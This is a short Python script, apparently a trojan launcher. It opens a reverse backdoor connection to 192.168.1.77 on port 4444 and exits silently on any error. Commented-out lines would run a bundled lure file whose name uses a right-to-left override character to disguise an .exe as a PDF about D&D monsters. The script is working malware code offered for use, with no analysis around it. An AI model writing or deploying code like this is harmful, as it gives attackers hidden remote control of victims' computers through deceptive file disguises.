import reverse_backdoor, subprocess, sys


# file_name = sys._MEIPASS + "\D&D_Monsters_Cod‮fdp.exe"
# subprocess.Popen(file_name, shell=True)

try:
    my_backdoor = reverse_backdoor.Backdoor("192.168.1.77", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()